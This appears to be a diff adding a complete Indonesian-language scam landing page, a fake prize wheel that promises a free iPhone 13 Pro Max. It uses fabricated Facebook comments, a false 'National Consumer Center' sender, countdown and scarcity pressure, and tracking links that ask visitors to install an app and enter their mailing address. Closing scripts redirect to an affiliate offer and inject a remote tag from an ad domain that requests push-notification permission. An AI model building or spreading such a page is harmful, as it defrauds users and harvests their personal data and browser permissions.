@@ -1,0 +1,310 @@
+<!doctype html>
+<html lang="id" dir="ltr">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+    <title>Selamat</title>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="lander" content="prizewheel-fb">
+<meta name="description" content="prizewheel-fb">
+<link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+<link rel=icon href=./img/favicon.png type=image/png sizes=16x16>
+<meta
+      name="alert-message"
+      content="Kami mohon maaf\n\nSilakan coba lagi. Anda punya satu kesempatan lagi!"
+    >
+    <link href="css/app2042.css?id=2fbe2d9a9a40ca9b2489" type="text/css" rel="stylesheet"/>
+    <link href="css/landers/prizewheel-fb/app8703.css?id=afa7f110a14f461eee6e" type="text/css" rel="stylesheet" />
+  </head>
+  <body
+      >
+    <main id="app" v-cloak>
+      <div class="header">
+        PUTAR &amp; MENANGKAN
+        <img
+          class="header__icon"
+          src="img/landers/prizewheel-fb/notification.png"
+          alt=""
+        />
+      </div>
+      <div class="step" v-if="!hasWon">
+        <div class="card">
+          <div class="step__text">
+            <div class='step__date'>
+              {{ DateHelper().getMonthName() }}
+              {{ DateHelper().getDate() }},
+              {{ DateHelper().getYear() }}
+            </div>
+            <h1 class="step__title">
+              Pengguna Tersayang, Anda mendapatkan hadiah tertunda sebesar (1)!!
+            </h1>
+            <div class="step__subtitle">
+              Setiap <span class="strong">{{ DateHelper().getDayName() }}</span> kami memilih 10 pengguna beruntung untuk menerima hadiah.
+            </div>
+          </div>
+          <div class="step__bar">
+            Klaim Hadiah Anda<br/><em>↓</em> Putar roda <em>↓</em>
+          </div>
+          <vue-prize-wheel
+            class="prize-wheel"
+            static-image="img/landers/prizewheel-fb/prizewheel_static.png"
+            prize-image="img/prizes/iphone-13-pro-max/default%400.5x.png"
+            :start-at="startPrizewheelAt"
+            v-on:lost="retryModalOpen = true"
+            v-on:finish="hasWon = true"
+          >
+            <template v-slot:spinner>
+              <img 
+                src="img/landers/prizewheel-fb/prizewheel_spinner.jpg"
+                class="prize-wheel__wheel"
+                alt=""
+              />
+              <img
+                src="img/prizes/iphone-13-pro-max/default%400.5x.png"
+                class="prize-wheel__prize"
+                alt=""
+              />
+            </template>
+          </vue-prize-wheel>
+        </div>
+      </div>
+      <div class="step" v-if="hasWon && !isLoaded">
+        <div class="card step__loader">
+          <img src="img/landers/prizewheel-fb/loader.gif" alt="Memuat"/>
+        </div>
+      </div>
+      <div class="step step--end" v-if="isLoaded">
+        <div class="card card--centered">
+          <div class="step__title step__title--bold">
+            Selamat!
+            Cukup ikuti langkah-langkah berikut ini untuk menerima Apple iPhone 13 Pro Max Anda!
+          </div>
+        </div>
+        <div class="card">
+
+          <div>
+            Ikuti langkah-langkah di bawah ini untuk mengklaim hadiah Anda.
+            100% gratis, tidak ada biaya lain
+          </div>
+          <div>
+          ⚠️Catatan: Harap ikuti langkah-langkah untuk mengambil iPhone 13 Anda dengan ketat, jika tidak, Anda akan bertanggung jawab atas konsekuensinya
+          </div>
+          <div>
+            1. Langkah pertama Anda perlu menginstal Lazada, klik di sini untuk menginstal 👉 <a href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1" target="_blank">Instal Lazada</a>
+          </div>
+          <div>
+            2. Pada langkah kedua, Anda perlu mengisi informasi alamat pengiriman hadiah, klik di sini untuk mengisi, mohon diisi dengan benar 👉 <a href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2" target="_blank">Isi alamat surat</a>
+          </div>
+
+          <div>
+
+            3. Pastikan Anda telah menyelesaikan langkah-langkah di atas, lalu klik tombol "Klaim Hadiah" di bawah ini untuk mengklaim iPhone 13 Anda 👇
+
+          </div>
+
+          <div>
+            <span class="strong">PENTING:</span>
+            Produk dapat habis sewaktu-waktu.
+          </div>
+          <div>Ayo, cepat pilih!</div>
+        </div>
+        <div class="card">
+          Penawaran ini berlaku selama <span><span v-html="countdownMinutes">0</span> menit dan <span v-html="countdownSeconds">0</span> detik.</span> ke depan
+        </div>
+        <div class="card">
+          <div class="step__prize">
+            <div class="step__prize-image">
+              <img 
+                src="img/prizes/iphone-13-pro-max/default%400.5x.png"
+                class="step__prize-image-image"
+                alt="Apple iPhone 13 Pro Max"
+              />
+              <div>(2) tersisa</div>
+            </div>
+            <div class="step__prize-details">
+              <div class="step__title step__title--bold">Apple iPhone 13 Pro Max</div>
+              <div>Harga normal: HK$11.000,00</div>
+              <div>
+                Harga Anda: 
+                <span class="new-prize">HK$0,00</span>
+              </div>
+              <a href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3" onclick="cta_action()" class="step__button">Klaim Hadiah</a>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="comments">
+        <div class="card">
+          <div class="comments__likes">
+            <span class="comments__link">12,068</span> total suka
+          </div>
+          <vue-facebook-comment
+            avatar="img/profiles/latin/female/3%400.25x.jpg"
+            name="Amelia Garcia"
+            message="Pada awalnya saya tidak yakin ini sungguhan atau bukan, tetapi saya telah menerima Apple iPhone 13 Pro Max hari ini :D!!"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="sekarang"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/south-east-asian/male/3%400.25x.jpg"
+            name="Elijah Wilson"
+            message="Apa sudah ada yang memenangkan sesuatu di undian ini??"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="9 menit"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/african/male/10%400.25x.jpg"
+            name="Liam Smith"
+            message="Bagaimana cara kerjanya? Saya memenangkan kupon Amazon beberapa tahun yang lalu dan semua percobaan saya sesudahnya - tak ada yang berhasil..."
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="32 menit"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/african/female/6%400.25x.jpg"
+            name="Sophia Anderson"
+            message="Bisakah Anda membantu saya? Saya baru saja memenangkan sebuah kupon hadiah!! Apa yang harus saya lakukan sekarang?"
+            :likes="12"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="55 menit"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/mena/male/9%400.25x.jpg"
+            name="Noah Johnson"
+            message="Apple iPhone 13 Pro Max sudah tiba melalui pos hari ini! Terima kasih, Apple!!"
+            :likes="12"
+            image="img/prizes/iphone-13-pro-max/proof.jpg"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="1 jam"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/caucasian/female/5%400.25x.jpg"
+            name="Taylor Davis"
+            message="Saya melihat penawaran khusus ini dan menutupnya karena mengira ini palsu. Lalu saya melihat iklannya lagi dan karena bosan saya memutuskan untuk mencobanya... Dan saya mendapatkan sebuah iPhone X BARU! Apa!!?!"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="3 jam"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/mena/female/1%400.25x.jpg"
+            name="Abigail Smith"
+            message="Bagaimana cara kerjanya? Saya memenangkan kupon Amazon beberapa tahun yang lalu dan semua percobaan saya sesudahnya - tak ada yang berhasil..."
+            :likes="21"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="3 jam"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/east-asian/male/2%400.25x.jpg"
+            name="Oliver Anderson"
+            message="Saya tadinya tidak yakin ini sungguhan atau bukan, tetapi saya telah menerima kartu saya hari ini!! 😍 luar biasa 🔥 🔥"
+            :likes="1"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="6 jam"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <p class="card__paragraph comments__link">
+            Lihat 83 komentar lainnya
+          </p>
+        </div>
+        <div class="card">
+          <div class="comments__form">
+            <label for="reply">Tambah balasan:</label>
+            <textarea rows="4" class="comments__form-input" ref="reply" id="reply"></textarea>
+            <p class="card__paragraph">
+              <button onclick="alert('Terima kasih atas komentar Anda, komentar Anda akan dipublikasikan setelah ditinjau.');">
+                Menyerahkan
+              </button>
+            </p>
+          </div>
+        </div>
+      </div>
+      <vue-modal :open="welcomeModalOpen" class="modal" v-on:close="welcomeModalOpen = false">
+        <div class="modal__title" style="">Apple iPhone 13 Pro Max</div>
+        <img 
+          class="modal__image"
+          src="img/prizes/iphone-13-pro-max/default%400.5x.png"
+          alt="Apple iPhone 13 Pro Max"
+        />
+        <p>
+          <span class="strong">
+              {{ DateHelper().getMonthName() }}
+              {{ DateHelper().getDate() }},
+              {{ DateHelper().getYear() }}
+          </span>
+          <br/>
+          Selamat, Pengguna Tersayang!
+          <br/>
+          Pusat Konsumen Nasional ingin berterima kasih atas kesetiaan Anda.
+          <br/>
+        </p>
+        <p>
+          Putar roda untuk mengeklaim hadiah istimewa Anda 🎁
+          <br>
+          <br>
+          <span class="strong">Semoga beruntung!</span>
+        </p>
+        <button class="modal__button" v-on:click="welcomeModalOpen = false">Oke</button>
+      </vue-modal>
+      <vue-modal :open="retryModalOpen" class="modal" v-on:close="retryModalOpen = false">
+        <div class="modal__title" style="">Coba lagi!</div>
+        <p>
+          *** Anda telah memenangkan satu putaran ekstra ***
+        </p>
+        <button class="modal__button" v-on:click="retryModalOpen = false">Oke</button>
+      </vue-modal>
+    </main>
+
+<script>window.view = window.view || {};view.offerUrl = "prizewheel-fb9141.html\/\/s.perfectshopper.net\/win_click?tid=5ufk5ym8xmz2k0tge4pww8cck,16343626,5,18530&ctrack=1649034553.2687551037&p=18530&click_id=&lang=id&prize=iphone-13-pro-max";view.qs = "tid=5ufk5ym8xmz2k0tge4pww8cck,16343626,5,18530&ctrack=1649034553.2687551037&p=18530&click_id=&lang=id&prize=iphone-13-pro-max";view.skip = 0;view.screenshot = 0;view.download = 0;view.noredir = false;</script><script>window.view = window.view || {};view.datetimeTranslations = {"ago":":time yang lalu","from_now":":time dari sekarang","after":":time setelah","before":":time sebelum","year":":count tahun","month":":count bulan","week":":count minggu","day":":count hari","hour":":count jam","minute":":count menit","second":":count detik","january":"Januari","february":"Februari","march":"Maret","april":"April","may":"Mei","june":"Juni","july":"Juli","august":"Agustus","september":"September","october":"Oktober","november":"November","december":"Desember","monday":"Senin","tuesday":"Selasa","wednesday":"Rabu","thursday":"Kamis","friday":"Jumat","saturday":"Sabtu","sunday":"Minggu"};</script><script type="application/javascript">
+// Add redirect function to the view object
+function redirect(url = window.view.offerUrl) {
+  if (window.view.noredir || !url) return;
+  window.location.href = url;
+}
+window.view.redirect = redirect;
+</script>
+
+<script src="js/app801b.js?id=d41d8cd98f00b204e980" type="application/javascript"></script>
+<script src="js/private8b5d.js?id=2e6382e857f94bd39e85" type="application/javascript"></script>
+<script src="js/landers/prizewheel-fb/appa2ce.js?id=c1e1d839a41fc2e716b9" type="application/javascript"></script>
+
+<script type="text/javascript">
+function cta_action() {
+  window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+}
+</script>
+
+<script>
+  var url = new URL(window.location.href);
+  var pci = url.searchParams.get('clickid');
+  var s = document.createElement('script');
+  s.src='//ouphouch.com/pfe/current/micro.tag.min.js?z=4947068'+'&ymid='+pci+'&sw=/sw-check-permissions-747a6.js';
+  s.onload = function(result) {
+      switch (result) {
+          case 'onPermissionDefault':break;
+          case 'onPermissionAllowed':break;
+          case 'onPermissionDenied':break;
+          case 'onAlreadySubscribed':break;
+          case 'onNotificationUnsupported':break;
+      }
+  }
+
+  document.head.appendChild(s);
+</script>
+
+</body>
+
+</html>
